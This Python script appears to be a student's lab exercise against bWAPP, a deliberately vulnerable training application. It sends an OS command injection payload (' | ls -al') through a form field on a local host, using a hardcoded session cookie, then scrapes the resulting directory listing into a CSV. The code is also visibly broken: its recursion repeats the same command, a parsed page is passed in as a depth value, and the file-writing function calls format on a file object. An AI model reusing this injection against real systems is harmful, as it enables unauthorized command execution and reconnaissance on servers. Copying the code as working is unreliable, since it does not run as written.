import requests
from bs4 import BeautifulSoup
    
headers = {
    "Referrer": "http://192.168.96.142/bWAPP/commandi.php",
    "Cookie" : "PHPSESSID=8edadb0eafe9e12953d759dc01c4489a; security_level=0"
}
data = {
    "target" : " | ls -al",
    "form" : "submit"    
}


result_dir = {}


#1. 일단 html연결하고 파싱할 데이터 들고오기
def Get():
    response = requests.post("http://192.168.96.142/bWAPP/commandi.php", headers=headers, data=data)
    if response.status_code == 200:
           html = response.text
    else:
        print("Error fetching HTML:", response.status_code)
    return BeautifulSoup(html, 'html.parser')
        


#2. 결과로부터 디렉토리 목록을 파싱하는 함수
def parse_directories(depth=1):
    
    handler = Get() #여기서 handler받아옴

    #해당 위치에서 디렉토리 몇개있나 출력
    dir_listing = handler.select_one('p[align="left"]')
    if dir_listing:
        split_dir = dir_listing.text.split('\n') #list
        dir={}
        for index,line in enumerate(split_dir) :
            
            if line.startswith('d'): #디렉토리면!!!
                parts = line.split()
                dir_name = parts[-1]
                parse_directories(depth + 1) 

            else : #파일이면!!!
                if line.strip():  # 빈 줄이 아닌 경우에만 처리
                    parts = line.split()
                    file_name = parts[-1]
                    dir[f"depth :{depth}"] = file_name
                    
            result_dir = dir
                       
    else : print("No directory listing found.")
 
    return result_dir
    


def toxl(args,data): #excel name 변수.
    fd = open("{}.csv", "a").format(args)
    fd.write(data)
    fd.close()


# 메인 함수
def main():
    soup = Get()
    if soup:
        result_dir = parse_directories(soup)
        toxl("beebox_result", result_dir)

if __name__ == "__main__":
    main()

 